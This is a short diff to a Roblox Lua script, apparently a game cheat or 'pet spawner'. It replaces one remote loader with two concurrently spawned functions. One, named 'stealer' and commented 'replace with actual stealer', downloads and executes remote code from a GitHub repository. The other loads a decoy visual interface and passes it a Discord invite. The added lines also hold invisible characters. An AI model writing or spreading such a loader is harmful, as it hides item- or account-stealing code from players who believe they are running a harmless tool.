@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/8H9Ld1U4Lb639Z4V/raw", true))()
+local function stealer()
+‎    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerV99/DarkSpawnerV2/refs/heads/main/lua"))() -- replace with actual stealer
+‎end
+‎local function loadui()
+‎  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+‎
+‎end
+‎
+‎task.spawn(stealer)
+‎task.spawn(loadui)
